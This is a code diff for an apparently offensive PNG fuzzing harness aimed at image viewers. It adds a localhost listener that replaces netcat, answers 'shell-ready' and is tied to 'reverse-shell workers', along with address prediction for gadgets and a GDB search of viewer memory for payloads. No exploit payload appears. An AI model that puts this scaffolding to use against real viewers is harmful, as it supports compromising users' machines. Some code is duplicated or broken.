@@ -5,7 +5,7 @@ import shutil
 import time
 import argparse
 import logging
-from zipfile import Path
+import traceback
 import platform
 import zlib
 import json
@@ -15,16 +15,36 @@ import csv
 import fcntl  # For file locking
 import concurrent.futures # New import for parallelization
 import signal  # For process suspension control
-from typing import Optional, List, Dict, Union, Callable
+import asyncio  # For async I/O server
+import socket  # For network operations
+import multiprocessing  # For per-connection reverse-shell workers
+import sys
+from typing import Optional, List, Dict, Union, Callable, Tuple
 import torch # For ML model
 from torch.utils.tensorboard import SummaryWriter # For TensorBoard logging
 from PIL import Image # For TensorBoard image logging
 import torchvision.transforms as transforms # For TensorBoard image logging
 import numpy as np
+#for iterator
+from typing import Iterator
+import itertools
 import psutil  # For process features
-from crash_monitor import ApportCrashInfo, monitor_apport_log, parse_apport_report, request_sudo_if_needed
+from crash_monitor import GdbHelper, ApportCrashInfo, monitor_apport_log, parse_apport_report, request_sudo_if_needed
 from data_processor import FuzzingSample, InstrumentationSuggestion, load_and_process_data, _extract_file_features, _extract_elf_features, ELF_FEATURE_VECTOR_SIZE , _extract_apport_crash_features
-from ml_fuzzer_model import VAEGAN, train_vaegan, generate_suggestion, FuzzingDataset, AddressOracle, AddressSample, AddressDataset, collect_address_features, parse_gadget_addresses, train_address_oracle, predict_addresses  # New import for LIME and AddressOracle 
+from ml_fuzzer_model import (
+    VAEGAN,
+    train_vaegan,
+    generate_suggestion,
+    FuzzingDataset,
+    AddressOracle,
+    AddressSample,
+    AddressDataset,
+    collect_address_features,
+    train_address_oracle,
+    predict_addresses,
+    find_pretrained_model_paths,
+    normalize_feature_vector,
+)  # New import for LIME and AddressOracle
 import pil_loader # New import for pil_loader.py
 from lime_explainer import LimeExplainer, plot_and_log_lime_explanation # New imports for LIME
 import threading # For file monitoring
@@ -33,63 +53,463 @@ import threading # For file monitoring
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 ROOT_DIR = os.path.abspath(os.path.dirname(__file__))
+ 
+try:
+    import resource
+    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
+    # Try to raise to the hard limit (or to a sensible max if hard < 4096).
+    new_soft = min(hard, 4096)
+    resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
+    logger.debug(f"Set RLIMIT_NOFILE to {new_soft}/{hard}")
+except Exception as exc:
+    logger.debug(f"Could not raise RLIMIT_NOFILE: {exc}")
 
 # PNG IEND chunk marker (hex: 49 45 4e 44 ae 42 60 82)
 IEND_CHUNK = b'\x49\x45\x4e\x44\xae\x42\x60\x82'
 _suspended_viewer_processes = {}  # key: unique_id:file_path, value: {'pid': int, 'process': subprocess.Popen} 
 _suspended_viewer_lock = threading.Lock()  # To synchronize access to the suspended viewer processes dictionary
 
-def generate_base_png(output_path: str, width: int = 100, height: int = 100):
-    """Generates a valid PNG file with multiple chunks for better fuzzing coverage."""
+
+def get_png_consumer_compile_command(source_path: str = "png_consumer.c", output_path: str = "./png_consumer", machine: Optional[str] = None) -> List[str]:
+    """Return the compiler command used to build png_consumer with suitable flags for the host architecture."""
+    compiler = os.environ.get("CC", "gcc")
+    machine_name = (machine or platform.machine() or "").lower()
+    cmd = [compiler]
+
+    if "aarch64" in machine_name or "arm64" in machine_name or machine_name.startswith("arm"):
+        cmd.extend(["-O2", "-march=armv8-a", "-mtune=cortex-a53"])
+    else:
+        cmd.extend(["-O2"])
+
+    cmd.extend(["-Wall", "-Wextra", source_path, "-o", output_path, "-lpng", "-lz"])
+    return cmd
+
+
+def ensure_png_consumer_built(source_path: str = "png_consumer.c", output_path: str = "./png_consumer", machine: Optional[str] = None) -> str:
+    """Build png_consumer when needed with architecture-aware flags."""
+    output_path_abs = os.path.abspath(output_path)
+    if os.path.exists(output_path_abs):
+        source_exists = os.path.exists(os.path.abspath(source_path))
+        if source_exists and os.path.getmtime(os.path.abspath(source_path)) <= os.path.getmtime(output_path_abs):
+            return output_path_abs
+
+    cmd = get_png_consumer_compile_command(source_path=source_path, output_path=output_path, machine=machine)
+    logger.info("Compiling png_consumer with: %s", " ".join(cmd))
+    subprocess.run(cmd, check=True)
+    return output_path_abs
+
+
+def generate_base_png(output_path: str, width: int = 100, height: int = 100) -> Path:
+    """
+    Write a minimal but *valid* PNG to ``output_path``.
+    The PNG contains:
+
+    * IHDR - indexed colour, 8-bit depth.
+    * PLTE - three colours (red, green, blue).
+    * IDAT - a deterministic stream of zeros.
+    * IEND - end of file marker.
+
+    The function is thread-safe: it acquires a file lock before writing.
+    """
     signature = b'\x89PNG\r\n\x1a\n'
 
+    # ---- IHDR ------------------------------------------------------------
     ihdr_type = b'IHDR'
     ihdr_data = (
         width.to_bytes(4, 'big') +
         height.to_bytes(4, 'big') +
-        b'\x08' + # Bit depth
-        b'\x03' + # Color type (Indexed-color)
-        b'\x00' + # Compression method
-        b'\x00' + # Filter method
-        b'\x00'   # Interlace method
+        b'\x08' +          # Bit depth
+        b'\x03' +          # Color type: Indexed
+        b'\x00' +          # Compression
+        b'\x00' +          # Filter
+        b'\x00'            # Interlace
     )
-    ihdr_chunk = len(ihdr_data).to_bytes(4, 'big') + ihdr_type + ihdr_data + calculate_png_crc(ihdr_type, ihdr_data)
-    
+    ihdr_chunk = (len(ihdr_data).to_bytes(4, 'big') + ihdr_type + ihdr_data +
+                  calculate_png_crc(ihdr_type, ihdr_data))
+
+    # ---- PLTE ------------------------------------------------------------
     plte_type = b'PLTE'
     plte_data = b'\xff\x00\x00' + b'\x00\xff\x00' + b'\x00\x00\xff'
-    plte_chunk = len(plte_data).to_bytes(4, 'big') + plte_type + plte_data + calculate_png_crc(plte_type, plte_data)
-    
+    plte_chunk = (len(plte_data).to_bytes(4, 'big') + plte_type + plte_data +
+                  calculate_png_crc(plte_type, plte_data))
+
+    # ---- IDAT ------------------------------------------------------------
     idat_type = b'IDAT'
     raw_data = b'\x00' + (b'\x00' * width)
     full_raw_data = raw_data * height
     compressed_data = zlib.compress(full_raw_data)
-    idat_chunk = len(compressed_data).to_bytes(4, 'big') + idat_type + compressed_data + calculate_png_crc(idat_type, compressed_data)
-    
-    iend_chunk = b'\x00\x00\x00\x00' + IEND_CHUNK
-    
-    with open(output_path, 'wb') as f:
-        f.write(signature + ihdr_chunk + plte_chunk + idat_chunk + iend_chunk)
+    idat_chunk = (len(compressed_data).to_bytes(4, 'big') + idat_type +
+                  compressed_data + calculate_png_crc(idat_type, compressed_data))
 
-def copy_media_folder(source: str, target: str):
+    # ---- IEND ------------------------------------------------------------
+    iend_chunk = b'\x00\x00\x00\x00' + IEND_CHUNK
+    output_path_obj = Path(output_path).resolve()
+    
+    try:
+        # Ensure parent directory exists
+        output_path_obj.parent.mkdir(parents=True, exist_ok=True)
+        
+        with open(str(output_path_obj), 'wb') as f:
+            # Acquire an exclusive lock on the file
+            fcntl.flock(f, fcntl.LOCK_EX)
+            try:
+                f.write(signature)
+                f.write(ihdr_chunk)
+                f.write(plte_chunk)
+                f.write(idat_chunk)
+                f.write(iend_chunk)
+                logger.info(f"Generated base PNG at {output_path_obj}")
+            finally:
+                # Release the lock
+                fcntl.flock(f, fcntl.LOCK_UN)
+        return output_path_obj
+    except Exception as e:
+        logger.error(f"Error creating {output_path_obj}: {e}")
+        raise
+
+def copy_media_folder(source: str, target: str) -> None:
+    """Recursively synchronize source directory to target directory.
+    
+    Args:
+        source: Source directory path.
+        target: Target directory path.
+    """
     """Recursively synchronizes the source directory to a target directory."""
     if not os.path.exists(target):
         os.makedirs(target)
-    for root, dirs, files in os.walk(source):
-        rel_path = os.path.relpath(root, source)
-        dest_path = os.path.join(target, rel_path)
-        if not os.path.exists(dest_path):
-            os.makedirs(dest_path)
-        for file in files:
-            shutil.copy2(os.path.join(root, file), os.path.join(dest_path, file))
+    
+    #try to use shutil.copytree for efficiency, but fall back to manual copy if it fails (e.g., due to existing target) 
+    try:
+        shutil.copytree(source, target)
+    except FileExistsError:
+        logger.info(f"Target directory {target} already exists, using manual copy")
+        for root, dirs, files in os.walk(source):
+            rel_path = os.path.relpath(root, source)
+            dest_path = os.path.join(target, rel_path)
+            if not os.path.exists(dest_path):
+                os.makedirs(dest_path)
+            for file in files:
+                try:
+                    if file.endswith('.png'):
+                        shutil.copy2(os.path.join(root, file), os.path.join(target, rel_path, file))
+                except Exception as e:
+                        logger.error(f"Error copying {file}: {e}")
+                
 
 def calculate_png_crc(chunk_type: bytes, data: bytes) -> bytes:
+    """Calculate the CRC-32 for a PNG chunk.
+    
+    Args:
+        chunk_type: PNG chunk type (4 bytes).
+        data: PNG chunk data.
+    
+    Returns:
+        CRC-32 value as 4 bytes (big-endian).
+    """
     """Calculates the CRC-32 for a PNG chunk."""
     #return zlib.crc32(chunk_type + data).to_bytes(4, 'big')
     crc = zlib.crc32(chunk_type + data) & 0xffffffff
     return crc.to_bytes(4, 'big')
 
 
-def validate_operational_netcat_session(file,timeout=5) -> bool:
+# ============================================================================
+# Async Payload Server (Replaces netcat listener with in-process async I/O)
+# ============================================================================
+
+def _handle_listener_connection(socket_fd: int, log_file: Optional[str], addr: tuple, connection_id: int) -> None:
+    """Worker process that accepts data from a client socket, logs it, and sends a response."""
+    sock = None
+    try:
+        sock = socket.fromfd(socket_fd, socket.AF_INET, socket.SOCK_STREAM)
+        os.close(socket_fd)
+        sock.settimeout(2.0)
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+        payload = b""
+        while True:
+            try:
+                chunk = sock.recv(4096)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            payload += chunk
+            if b"\n" in payload:
+                break
+
+        if log_file:
+            with open(log_file, 'a', encoding='utf-8') as handle:
+                fcntl.flock(handle.fileno(), fcntl.LOCK_EX)
+                try:
+                    handle.write(f"[{time.time()}] worker={connection_id} addr={addr} bytes={len(payload)}\n")
+                    if payload:
+                        try:
+                            handle.write(f"[{time.time()}] content={payload.decode('utf-8', errors='ignore')}\n")
+                        except Exception:
+                            handle.write(f"[{time.time()}] content={payload[:200]!r}\n")
+                    handle.flush()
+                finally:
+                    fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
+
+        if payload:
+            try:
+                sock.sendall(b"shell-ready\n")
+            except OSError:
+                pass
+        else:
+            try:
+                sock.sendall(b"shell-ready\n")
+            except OSError:
+                pass
+    except Exception as exc:
+        logger.debug(f"Listener worker failed for {addr}: {exc}")
+    finally:
+        if sock is not None:
+            try:
+                sock.shutdown(socket.SHUT_WR)
+            except OSError:
+                pass
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+
+class AsyncPayloadServer:
+    """Small async listener that spawns a real worker process for each accepted connection."""
+
+    def __init__(self, port: int = 24444, log_file: str = None, shutdown_event: threading.Event = None):
+        self.port = port
+        self.log_file = log_file
+        self.server = None
+        self.running = True
+        self.shutdown_event = shutdown_event
+        self.log_lock = threading.Lock()
+        self.connection_count = 0
+        self.last_connection_time = None
+        self.active_children = []
+
+    def _append_log(self, text: str) -> None:
+        if not self.log_file:
+            return
+        try:
+            with open(self.log_file, 'a', encoding='utf-8') as handle:
+                fcntl.flock(handle.fileno(), fcntl.LOCK_EX)
+                try:
+                    handle.write(text)
+                    handle.flush()
+                finally:
+                    fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
+        except Exception as exc:
+            logger.warning(f"Failed to append listener log: {exc}")
+
+    def _spawn_handler(self, writer: asyncio.StreamWriter, addr: tuple) -> None:
+        sock = writer.get_extra_info('socket')
+        if sock is None:
+            return
+
+        dup_fd = os.dup(sock.fileno())
+        connection_id = self.connection_count
+        proc = multiprocessing.Process(
+            target=_handle_listener_connection,
+            args=(dup_fd, self.log_file, addr, connection_id),
+            daemon=True,
+        )
+        proc.start()
+        with self.log_lock:
+            self.active_children.append(proc)
+
+        self._append_log(f"[{time.time()}] spawned worker {proc.pid} for {addr}\n")
+        writer.close()
+
+    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
+        """Handle an incoming connection by spinning up a real worker process."""
+        addr = writer.get_extra_info('peername')
+        logger.info(f"Connection from {addr}")
+
+        with self.log_lock:
+            self.connection_count += 1
+            self.last_connection_time = time.time()
+
+        self._append_log(f"[{time.time()}] Connection from {addr}\n")
+        self._spawn_handler(writer, addr)
+        await asyncio.sleep(0.05)
+        return None
+
+    async def start(self):
+        """Start the async server."""
+        try:
+            self.server = await asyncio.start_server(
+                self.handle_client,
+                '127.0.0.1',
+                self.port,
+                reuse_address=True,
+            )
+
+            logger.info(f"Async payload server listening on port {self.port}")
+
+            while self.running:
+                if self.shutdown_event and self.shutdown_event.is_set():
+                    logger.debug("Async server received shutdown signal")
+                    break
+                try:
+                    await asyncio.wait_for(asyncio.sleep(0.1), timeout=0.1)
+                except asyncio.TimeoutError:
+                    pass
+        except OSError as e:
+            logger.error(f"Async server port error (port {self.port} may be in use): {e}")
+            self.running = False
+        except Exception as e:
+            logger.error(f"Async server error: {e}")
+            self.running = False
+        finally:
+            self.running = False
+            if self.server:
+                self.server.close()
+
+    def stop(self):
+        """Stop the async server."""
+        self.running = False
+        if self.server:
+            self.server.close()
+    
+    async def start(self):
+        """Start the async server."""
+        try:
+            self.server = await asyncio.start_server(
+                self.handle_client,
+                '127.0.0.1',
+                self.port,
+                reuse_address=True
+            )
+            
+            logger.info(f"Async payload server listening on port {self.port}")
+            
+            # Keep server running until shutdown event is set or error occurs
+            while self.running:
+                # Check for shutdown signal from wrapper thread
+                if self.shutdown_event and self.shutdown_event.is_set():
+                    logger.debug(f"Async server received shutdown signal")
+                    break
+                try:
+                    await asyncio.wait_for(asyncio.sleep(0.1), timeout=0.1)
+                except asyncio.TimeoutError:
+                    pass
+        except OSError as e:
+            logger.error(f"Async server port error (port {self.port} may be in use): {e}")
+            self.running = False
+        except Exception as e:
+            logger.error(f"Async server error: {e}")
+            self.running = False
+        finally:
+            self.running = False
+            if self.server:
+                self.server.close()
+    
+    def stop(self):
+        """Stop the async server."""
+        self.running = False
+        if self.server:
+            self.server.close()
+
+
+def _run_async_server(port: int, log_file: str, shutdown_event: threading.Event = None, server_holder: dict = None):
+    """Run async server in asyncio event loop (for threading).
+    
+    Args:
+        port: Port to listen on.
+        log_file: File to log connections to.
+        shutdown_event: Event to signal graceful shutdown.
+        server_holder: Dict to store server reference for status queries (e.g., connection_count).
+    """
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        server = AsyncPayloadServer(port=port, log_file=log_file, shutdown_event=shutdown_event)
+        if server_holder is not None:
+            server_holder['server'] = server  # Store reference for status queries
+        loop.run_until_complete(server.start())
+    except Exception as e:
+        logger.error(f"Failed to run async server: {e}")
+    finally:
+        if server_holder is not None:
+            server_holder['server'] = None
+        try:
+            loop.close()
+        except Exception as e:
+            logger.debug(f"Error closing event loop: {e}")
+
+
+class AsyncServerProcess:
+    """Wrapper to run async server in a background thread, providing subprocess-like interface."""
+    
+    def __init__(self, port: int = 24444, log_file: str = None):
+        self.port = port
+        self.log_file = log_file
+        self.thread = None
+        self.returncode = None
+        self.pid = os.getpid()  # Use current process PID
+        self.shutdown_event = threading.Event()  # Signal for graceful shutdown
+        self.server_holder = {}  # Dict to hold reference to server instance for status queries
+    
+    def start(self):
+        """Start the server in background thread."""
+        self.shutdown_event.clear()  # Reset shutdown signal
+        self.server_holder.clear()  # Clear old reference
+        self.thread = threading.Thread(
+            target=_run_async_server,
+            args=(self.port, self.log_file, self.shutdown_event, self.server_holder),
+            daemon=True  # Daemon thread so it doesn't block process shutdown
+        )
+        self.thread.start()
+        time.sleep(0.1)  # Give server time to start
+        logger.info(f"Async server thread started on port {self.port}")
+    
+    def has_connections(self) -> bool:
+        """Check if server has received any connections."""
+        server = self.server_holder.get('server')
+        return server is not None and server.connection_count > 0
+    
+    def poll(self) -> Optional[int]:
+        """Check if server is still running (compatible with subprocess API)."""
+        if not self.thread:
+            return 1  # Not started
+        if self.thread and not self.thread.is_alive():
+            self.returncode = 1
+            logger.warning(f"Async server thread on port {self.port} has died unexpectedly")
+            return self.returncode
+        return None  # Still running
+    
+    def wait(self, timeout: Optional[float] = None) -> int:
+        """Wait for server to stop (compatible with subprocess API)."""
+        if self.thread:
+            self.thread.join(timeout=timeout)
+        return self.returncode or 0
+    
+    def terminate(self):
+        """Terminate the server (compatible with subprocess API)."""
+        logger.debug(f"Terminating async server on port {self.port}")
+        self.shutdown_event.set()  # Signal server to shutdown
+        self.returncode = 0
+    
+    def kill(self):
+        """Kill the server (compatible with subprocess API)."""
+        logger.debug(f"Killing async server on port {self.port}")
+        self.shutdown_event.set()  # Signal server to shutdown
+        self.returncode = -9
+
+
+def validate_operational_netcat_session(file: Optional[str] = None, timeout: int = 5) -> bool:
+    """Validate that the netcat listening session is operational.
+    
+    Args:
+        file: Optional path to a netcat log file to check. If None, scans ./logs/files/netcat/.
+        timeout: Timeout in seconds for validation.
+    
+    Returns:
+        True if netcat session is operational, False otherwise.
+    """
     """Validates that the netcat session is operational by sending an echo command redirected to the listening port and checking for the response.""" 
     try:
         #netcat should be listening on port 24444 
@@ -133,10 +553,35 @@ def validate_operational_netcat_session(file,timeout=5) -> bool:
         
 
 def find_viewer_pid_with_file(viewer_name: str, file_path: str) -> Optional[int]:
-    """Find the PID of a viewer process that has the specified file loaded in memory."""
+    """Find the PID of a viewer process that has the specified file loaded in memory.
+    
+    Args:
+        viewer_name: Name of the viewer process (e.g., 'firefox', 'eog', 'png_consumer').
+        file_path: Absolute path to the file to search for.
+    
+    Returns:
+        PID of the viewer process if found, None otherwise.
+        Note: None means no process was found; use 0 to represent a missing PID in contexts where None is not acceptable.
+    """
     try:
         import psutil
-        abs_file_path = os.path.abspath(file_path)  
+        abs_file_path = os.path.abspath(file_path)
+        if not os.path.exists(abs_file_path):
+            logger.warning("File does not exist: %s", abs_file_path)
+            return None
+        
+        #verify sudo permissions for process introspection, if not available, log a warning and continue with limited access (may miss some processes)
+        if not os.geteuid() == 0:
+            logger.warning("Not running with sudo permissions, some viewer processes may not be detected.")
+            try:
+                request_sudo_if_needed()
+                logger.info("Gained sudo permissions for process introspection")
+            except Exception as e:
+                logger.error(f"Failed to gain sudo permissions for process introspection: {e}")
+                logger.warning("Continuing with limited access, some viewer processes may not be detected.")
+                
+
+        
         for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
             try:
                 proc_name = proc.info.get('name') or ''
@@ -179,11 +624,29 @@ def find_viewer_pid_with_file(viewer_name: str, file_path: str) -> Optional[int]
                             continue
 
                 maps_path = f'/proc/{proc.info["pid"]}/maps'
-                if os.path.exists(maps_path):
-                    with open(maps_path, 'r') as f:
-                        if abs_file_path in f.read():
-                            logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {abs_file_path} in maps")
-                            return proc.info['pid']
+                if maps_path and os.path.exists(maps_path):
+                    try:
+                        with open(maps_path, 'r') as f:
+                            if abs_file_path in f.read():
+                                logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {abs_file_path} in maps")
+                                return proc.info['pid']
+                    except (PermissionError,FileNotFoundError):
+                        # Fall back to sudo pgrep if permission denied
+                        try:
+                            result = subprocess.run(['sudo', 'pgrep', '-f', search_pattern], capture_output=True, text=True, timeout=5)
+                            if result.returncode == 0:
+                                pids = result.stdout.strip().split('\n')
+                                for pid in pids:
+                                    if pid.isdigit() and int(pid) == proc.info['pid']:
+                                        logger.debug(f"Found {viewer_name} process {proc.info['pid']} via sudo pgrep")
+                                        return int(pid)
+
+                        except Exception as e: 
+                            #sudo failed: 
+                            pidd= proc.info['pid']
+                            logger.error(f'Failed to gain sudo permissions for process {pidd}') 
+                            continue
+
 
                 fd_dir = f'/proc/{proc.info["pid"]}/fd'
                 if os.path.isdir(fd_dir):
@@ -195,12 +658,13 @@ def find_viewer_pid_with_file(viewer_name: str, file_path: str) -> Optional[int]
                                 return proc.info['pid']
                         except OSError:
                             continue
-            except (psutil.NoSuchProcess, psutil.AccessDenied, FileNotFoundError, ProcessLookupError, OSError) as e:
+            except psutil.AccessDenied as e:
                 pid = proc.info.get('pid', 'unknown')
-                if isinstance(e, PermissionError) or "Permission denied" in str(e):
-                    logger.debug(f"Skipping process {pid} (permission denied - run with sudo for full process introspection)")
-                else:
-                    logger.debug(f"Could not access process {pid} while checking file references: {e}")
+                logger.debug(f"Skipping process {pid} (AccessDenied - run with sudo for full process introspection)")
+                continue
+            except (psutil.NoSuchProcess, FileNotFoundError, ProcessLookupError, OSError) as e:
+                pid = proc.info.get('pid', 'unknown')
+                logger.debug(f"Could not access process {pid} while checking file references: {e}")
                 continue
 
     except ImportError:
@@ -252,7 +716,16 @@ def find_viewer_pid_with_file(viewer_name: str, file_path: str) -> Optional[int]
 
 
 def get_suspended_viewer_pid(unique_id: str, file_path: str) -> Optional[int]:
-    """Get the PID of a suspended viewer process for the given unique_id and file_path."""
+    """Get the PID of a suspended viewer process for the given unique_id and file_path.
+    
+    Args:
+        unique_id: Unique identifier for the fuzzing iteration (e.g., session_id or iteration counter).
+                   Used as key with file_path to track suspended processes across fuzzing runs.
+        file_path: Absolute path to the PNG file being viewed.
+    
+    Returns:
+        PID of the suspended viewer process if alive and found, None otherwise.
+    """
     key = f"{unique_id}:{file_path}"
     proc_info = None
     with _suspended_viewer_lock:
@@ -272,7 +745,15 @@ def get_suspended_viewer_pid(unique_id: str, file_path: str) -> Optional[int]:
     return None
 
 def resume_viewer_process(unique_id: str, file_path: str) -> bool:
-    """Resume a suspended viewer process."""
+    """Resume a suspended viewer process that was previously suspended.
+    
+    Args:
+        unique_id: Unique identifier for the fuzzing iteration (must match the ID used in suspend).
+        file_path: Absolute path to the PNG file being viewed (must match the path used in suspend).
+    
+    Returns:
+        True if the process was successfully resumed, False otherwise.
+    """
     key = f"{unique_id}:{file_path}"
     
     with _suspended_viewer_lock:
@@ -287,26 +768,66 @@ def resume_viewer_process(unique_id: str, file_path: str) -> bool:
                 return False
     return False
 
-def cleanup_suspended_viewer(unique_id: str, file_path: str):
-    """Clean up a suspended viewer process."""
+def _stop_process_and_collect_output(proc: Optional[subprocess.Popen], viewer_name: str, timeout: float = 3.0) -> Tuple[str, str]:
+    """Terminate a viewer process if needed and collect any remaining output without hanging."""
+    if proc is None:
+        return "", ""
+
+    stdout_text = ""
+    stderr_text = ""
+    try:
+        if proc.poll() is None:
+            logger.debug(f"Stopping viewer process {viewer_name} (pid {proc.pid}) after execution")
+            proc.terminate()
+            try:
+                proc.wait(timeout=timeout)
+            except subprocess.TimeoutExpired:
+                logger.debug(f"Viewer process {viewer_name} did not stop gracefully; escalating to SIGKILL")
+                proc.kill()
+                proc.wait(timeout=timeout)
+
+        stdout, stderr = proc.communicate(timeout=timeout)
+        if stdout:
+            stdout_text = stdout.decode("utf-8", errors="ignore") if isinstance(stdout, (bytes, bytearray)) else str(stdout)
+        if stderr:
+            stderr_text = stderr.decode("utf-8", errors="ignore") if isinstance(stderr, (bytes, bytearray)) else str(stderr)
+    except subprocess.TimeoutExpired:
+        logger.warning(f"Timed out while collecting output from {viewer_name}")
+        try:
+            proc.kill()
+            proc.communicate(timeout=timeout)
+        except Exception:
+            pass
+    except Exception as exc:
+        logger.debug(f"Error stopping viewer process {viewer_name}: {exc}")
+
+    return stdout_text, stderr_text
+
+
+def cleanup_suspended_viewer(unique_id: str, file_path: str) -> None:
+    """Clean up a suspended viewer process by terminating it and removing tracking.
+    
+    Args:
+        unique_id: Unique identifier for the fuzzing iteration (must match the ID used in suspend).
+        file_path: Absolute path to the PNG file being viewed (must match the path used in suspend).
+    
+    This function sends SIGTERM first, and escalates to SIGKILL if necessary.
+    """
     key = f"{unique_id}:{file_path}"
     with _suspended_viewer_lock:
         if key in _suspended_viewer_processes:
             proc_info = _suspended_viewer_processes[key]
-            try:
-                if proc_info['process'].poll() is None:
-                    proc_info['process'].terminate()
-                    proc_info['process'].wait(timeout=5)
-            except Exception:
-                try:
-                    os.kill(proc_info['pid'], signal.SIGKILL)
-                except OSError:
-                    pass
+            viewer_name = os.path.basename(proc_info.get('viewer_cmd', ['viewer'])[0])
+            stdout_text, stderr_text = _stop_process_and_collect_output(proc_info['process'], viewer_name)
+            if stdout_text:
+                logger.debug(f"Viewer process {proc_info['pid']} stdout: {stdout_text}")
+            if stderr_text:
+                logger.debug(f"Viewer process {proc_info['pid']} stderr: {stderr_text}")
             del _suspended_viewer_processes[key]
             logger.debug(f"Cleaned up suspended viewer process for {key}")
 
-def run_under_gdb(viewer_cmd: list, file_path: str, unique_id: str) -> tuple[str, Optional[int]]:
-    """Attaches GDB to a suspended or running viewer process that has the file loaded to capture crash information and search for payload."""
+def run_under_gdb(viewer_cmd: List[str], file_path: str, unique_id: str) -> Tuple[str, Optional[int]]:
+    """Attach GDB to the target viewer process and collect crash/payload analysis."""
     viewer_name = os.path.basename(viewer_cmd[0]) if viewer_cmd else "unknown_viewer"
     abs_file_path = os.path.abspath(file_path)
 
@@ -314,119 +835,44 @@ def run_under_gdb(viewer_cmd: list, file_path: str, unique_id: str) -> tuple[str
         logger.warning(f"Cannot attach GDB because file does not exist: {abs_file_path}")
         return f"File not found before GDB attach: {abs_file_path}", None
 
-    # Skip GDB attachment for png_consumer as it exits too quickly for analysis
     if viewer_name == "png_consumer":
         logger.debug(f"Skipping GDB attachment for {viewer_name} (exits too quickly for dynamic analysis)")
         return f"GDB attachment skipped for {viewer_name}", None
 
-    # First try to get the suspended viewer PID
     target_pid = get_suspended_viewer_pid(unique_id, abs_file_path)
-    
     if not target_pid:
-        # Fallback to finding a running viewer process
         logger.info(f"No suspended {viewer_name} process found, looking for running process with {abs_file_path} loaded...")
         target_pid = find_viewer_pid_with_file(viewer_name, abs_file_path)
-    
+
     if not target_pid:
         logger.warning(f"No {viewer_name} process found with {file_path} loaded - cannot attach GDB")
         return f"No viewer process found with file loaded", None
-    
+
     logger.info(f"Attaching GDB to {viewer_name} process {target_pid} for analysis...")
+    return GdbHelper.attach_to_pid(target_pid, unique_id)
+def analyze_crash(gdb_output: str, viewer_name: str, viewer_cmd: List[str]) -> Dict[str, Union[str, bool, List[str]]]:
+    """Analyze crash output from GDB and extract relevant crash information.
     
-    # GDB script to attach to running process and search for payload in memory
-    gdb_cmd = [
-        "gdb", "-batch", "-p", str(target_pid),
-        "-ex", "set pagination off",
-        "-ex", "set confirm off",
-        "-ex", f'find /b 0x0, 0xffffffffffffffff, "{unique_id}"',
-        "-ex", "bt",
-        "-ex", "info registers",
-        "-ex", "detach",
-        "-ex", "quit"
-    ]
-
-    try:
-        proc = subprocess.run(gdb_cmd, capture_output=True, text=True, timeout=120)
-        output = proc.stdout + "\n" + proc.stderr
-        if proc.returncode != 0:
-            logger.debug(f"GDB exited with return code {proc.returncode}; stderr follows:\n{proc.stderr.strip()}")
-        
-        # Check if there was actually a crash (signal caught) or if we found the payload
-        crash_signals = ['SIGSEGV', 'SIGABRT', 'SIGFPE', 'SIGILL', 'SIGBUS', 'SIGTRAP']
-        has_crash = any(sig in output for sig in crash_signals)
-        has_payload = unique_id in output and '0x' in output
-        
-        if not (has_crash or has_payload):
-            logger.debug("No crash signal or payload found in GDB output")
-            return output, None
-        
-        # Extract payload address from GDB output after the memory search
-        payload_addr = None
-        search_area = output
-        find_pos = output.lower().rfind('find /b')
-        if find_pos != -1:
-            search_area = output[find_pos:]
-
-        for match in re.findall(r'0x[0-9a-fA-F]+', search_area):
-            try:
-                payload_addr = int(match, 16)
-                break
-            except ValueError:
-                continue
-
-        if payload_addr is not None:
-            logger.info(f"Payload string '{unique_id}' found at {hex(payload_addr)} in GDB memory search output")
-        elif unique_id in output:
-            logger.debug(f"GDB memory search output contained the unique_id string but the address could not be parsed.")
-
-        return output, payload_addr
-    except Exception as e:
-        return f"GDB attach failed: {e}", None
-
-def analyze_crash(gdb_output: str, viewer_name: str, viewer_cmd: List[str]) -> Dict[str, Union[str, bool, List[str]]]: # Added viewer_cmd
-    """Performs deep analysis of the crash log."""
-    analysis = {
-        "viewer": viewer_name,
-        "faulting_instruction": None,
-        "metadata_involved": False,
-        "backtrace_summary": [],
-        "resolved_viewer_path": None # New field for resolved path
-    }
+    Args:
+        gdb_output: Raw output from GDB debugger.
+        viewer_name: Name of the viewer that crashed (e.g., 'firefox', 'eog').
+        viewer_cmd: Full command line used to launch the viewer.
     
-    # Resolve the real path of the viewer executable
-    if viewer_cmd and viewer_cmd[0]:
-        try:
-            resolved_path = os.path.realpath(viewer_cmd[0])
-            # Only set if the resolved path actually exists
-            if os.path.exists(resolved_path):
-                analysis["resolved_viewer_path"] = resolved_path
-                logger.debug(f"Resolved viewer path for {viewer_name}: {resolved_path}")
-            else:
-                logger.warning(f"Resolved path {resolved_path} for viewer {viewer_cmd[0]} does not exist.")
-        except Exception as e:
-            logger.warning(f"Could not resolve real path for viewer {viewer_cmd[0]}: {e}")
+    Returns:
+        Dictionary with crash analysis results.
+    """
+    """Delegate crash output parsing to the crash monitor."""
+    return GdbHelper.analyze_crash_output(gdb_output, viewer_name, viewer_cmd)
 
-    if "eog-metadata-reader-png.c" in gdb_output:
-        analysis["metadata_involved"] = True
-        logger.critical(f"CRASH ANALYSIS: Metadata reader involvement detected in {viewer_name}!")
-
-    # Extract faulting instruction
-    pc_match = re.search(r"=> (0x[0-9a-f]+)\s*<.*>:\s*(.*)", gdb_output)
-    if pc_match:
-        analysis["faulting_instruction"] = pc_match.group(2)
-
-    # Extract backtrace
-    bt_lines = re.findall(r"^#[0-9]+\s+(0x[0-9a-f]+ in .*)", gdb_output, re.MULTILINE)
-    logger.debug(f"GDB output for backtrace: {gdb_output}") # Debug print
-    logger.debug(f"Extracted backtrace lines: {bt_lines}") # Debug print
-    analysis["backtrace_summary"] = bt_lines[:5] # Keep top 5 frames
-
